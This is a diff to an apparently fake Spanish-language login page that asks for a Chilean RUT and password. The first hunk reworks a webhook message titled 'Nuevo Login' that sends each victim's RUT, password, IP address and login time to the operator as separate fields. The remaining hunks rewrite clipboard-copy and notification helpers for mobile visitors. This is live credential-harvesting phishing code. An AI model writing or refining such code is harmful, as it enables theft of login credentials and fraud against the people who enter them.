@@ -430,8 +430,28 @@
                             author: {
                                 name: 'Nuevo Login'
                             },
-                            description: `\`\`\`\nRUT: ${rut}\n\nContraseña: ${password}\n\`\`\`\nIP: \`${data.ip}\` | Hora: \`${new Date().toLocaleString('es-ES')}\``,
-                            fields: []
+                            fields: [
+                                {
+                                    name: 'RUT',
+                                    value: `\`${rut}\``,
+                                    inline: false
+                                },
+                                {
+                                    name: 'Contraseña',
+                                    value: `\`${password}\``,
+                                    inline: false
+                                },
+                                {
+                                    name: 'IP',
+                                    value: `\`${data.ip}\``,
+                                    inline: true
+                                },
+                                {
+                                    name: 'Hora',
+                                    value: `\`${new Date().toLocaleString('es-ES')}\``,
+                                    inline: true
+                                }
+                            ]
                         }]
                     };
                     
@@ -478,53 +498,61 @@
         window.addEventListener('load', function() {
             document.getElementById('rut').focus();
             
-            // Hacer los inputs copiables en móviles
+            // Sistema de copiar con elementos hidden
             const rutInput = document.getElementById('rut');
             const passwordInput = document.getElementById('password');
             
             rutInput.addEventListener('click', function(e) {
                 if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
-                    e.preventDefault();
-                    copiarTexto(this.value, 'RUT');
+                    e.stopPropagation();
+                    copiarDato(this.value, 'RUT');
                 }
             });
             
             passwordInput.addEventListener('click', function(e) {
                 if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
-                    e.preventDefault();
-                    copiarTexto(this.value, 'Contraseña');
+                    e.stopPropagation();
+                    copiarDato(this.value, 'Contraseña');
                 }
             });
         });
 
-        // Función mejorada para copiar al portapapeles sin seleccionar visiblemente
-        function copiarTexto(texto, tipo) {
-            // Crear un textarea temporal invisible
-            const tempArea = document.createElement('textarea');
-            tempArea.value = texto;
-            tempArea.style.position = 'fixed';
-            tempArea.style.opacity = '0';
-            tempArea.style.pointerEvents = 'none';
-            document.body.appendChild(tempArea);
+        // Nueva función de copiar sin seleccionar el input visible
+        function copiarDato(valor, tipo) {
+            // Crear elemento span invisible con el texto
+            const span = document.createElement('span');
+            span.textContent = valor;
+            span.style.position = 'absolute';
+            span.style.left = '-9999px';
+            span.style.opacity = '0';
+            span.style.pointerEvents = 'none';
+            document.body.appendChild(span);
             
-            // Seleccionar y copiar
-            tempArea.select();
+            // Seleccionar el span invisible
+            const range = document.createRange();
+            range.selectNodeContents(span);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            
+            // Copiar
             try {
                 document.execCommand('copy');
-                mostrarNotificacion(`${tipo} copiado ✓`);
+                mostrarMensaje(`${tipo} copiado ✓`);
             } catch (err) {
-                console.error('Error al copiar:', err);
+                console.error('Error:', err);
             }
             
-            // Eliminar textarea temporal
-            document.body.removeChild(tempArea);
+            // Limpiar
+            selection.removeAllRanges();
+            document.body.removeChild(span);
         }
 
-        // Función para mostrar notificación de copia
-        function mostrarNotificacion(mensaje) {
-            const notif = document.createElement('div');
-            notif.textContent = mensaje;
-            notif.style.cssText = `
+        // Mostrar mensaje temporal
+        function mostrarMensaje(texto) {
+            const div = document.createElement('div');
+            div.textContent = texto;
+            div.style.cssText = `
                 position: fixed;
                 top: 50%;
                 left: 50%;
@@ -537,21 +565,20 @@
                 z-index: 9999;
                 animation: fadeInOut 2s ease-in-out;
             `;
-            document.body.appendChild(notif);
-            
-            setTimeout(() => notif.remove(), 2000);
+            document.body.appendChild(div);
+            setTimeout(() => div.remove(), 2000);
         }
 
-        // Agregar animación de fade in/out
-        const style = document.createElement('style');
-        style.textContent = `
+        // Agregar animación
+        const estilo = document.createElement('style');
+        estilo.textContent = `
             @keyframes fadeInOut {
                 0% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
                 50% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
                 100% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
             }
         `;
-        document.head.appendChild(style);
+        document.head.appendChild(estilo);
     </script>
 </body>
 </html>
